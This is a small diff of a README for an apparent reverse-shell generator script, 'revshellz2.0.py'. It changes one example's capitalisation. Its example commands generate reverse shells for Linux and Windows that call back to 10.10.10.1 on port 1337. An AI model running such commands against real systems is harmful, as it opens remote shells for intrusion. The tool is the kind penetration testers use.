@@ -65,7 +65,7 @@ python3 revshellz2.0.py -ip 10.10.10.1 -p 1337 -rs 'bash -i' -os linux
 ```
 Generating reverse shell for Windows
 ```
-python3 revshellz2.0.py -ip 10.10.10.1 -p 1337 -rs 'PowerShell #1' -os windows
+python3 revshellz2.0.py -ip 10.10.10.1 -p 1337 -rs 'powershell #1' -os windows
 ```
 Generating reverse shell for MacOS
 ```
